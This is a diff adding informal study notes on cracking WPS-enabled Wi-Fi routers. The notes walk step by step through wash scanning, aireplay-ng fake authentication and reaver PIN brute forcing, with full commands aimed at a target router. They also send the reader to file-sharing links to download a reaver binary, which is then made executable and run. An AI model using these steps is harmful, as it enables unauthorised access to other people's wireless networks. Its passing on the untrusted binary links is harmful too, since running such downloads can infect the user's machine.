@@ -1,0 +1,67 @@
+to see all the networks that has wps that is enabled:
+this is the command: 
+> wash --interface wlan0
+
+we don't care about whether it's wpa or wpa2 
+because we are going to be exploiting a feature
+if enabled is going to connect us
+
+note:
+if you see that Lck is No meaning you can try this attack
+
+things to do:
+1. associate with the target network
+using fake authentication attack
+--> this says i want to communicate with you, please
+don't ignore me so that when the attack runs, the
+network will start accepting the PINs
+
+note:
+PIN - personal identification number 
+
+this is the command:
+> aireplay-ng --fakeauth 30 -a (mac address of target router) 
+-h(mac addres of our wireless adapter) wlan0
+
+note:
+> --fakeauth 30 meaning you are going to associate every 30 seconds
+
+2. run reaver
+reaver is a program that will bruteforce the pin
+and only then (after we run the reaver stuff) will we
+associate with the target.
+YOU HAVE TO RUN THIS REAVER FIRST AFTER THAT YOU ASSOCIATE
+WITH THE TARGET!
+
+this is the command: 
+> reaver --bssid (the target router's bssid) --channel (the 
+target router channel) --interface (the interface) -vvv --no-associate
+
+note:
+-vvv meaning you are making the reaver showing as much information
+as possible if it runs into an error
+--no-associate meaning you are making reaver not to associate
+with the target network because this is really buggy 
+and you don't want to use this, since you already trying to
+associate using the aireplay-ng thing
+
+steps:
+1. press enter in the reaver
+2. press enter in the association of aireplay-ng
+
+if you get bugs, they still haven't fixed it meaning it's better
+to use an older version
+
+this is the reaver's download link:
+https://ufile.io/lro4nkdv
+alternative:
+https://doc-04-bc-docs.googleusercontent.com/docs/securesc/vtjcslg83bj0kemj2i8cm6tmhviq25c8/im23bdovgr36m3tuck1ojb3uitug9a8q/1618996125000/03309220244398476455/13965198407570679311/1zkNcgMEKGC8wL19JPRigncMoGXC-NF7Q?e=download&authuser=0&nonce=4dq5pg2kefmu6&user=13965198407570679311&hash=jqhe7g49bp1f4ifgqo6jdkh9i1k1tdeu
+
+after that to use this reaver:
+(in the directory where you store the reaver's download file)
+> chmod +x reaver
+> ./reaver --bssid (the target router's bssid) --channel (the 
+target router channel) --interface (the interface) -vvv --no-associate
+
+
+
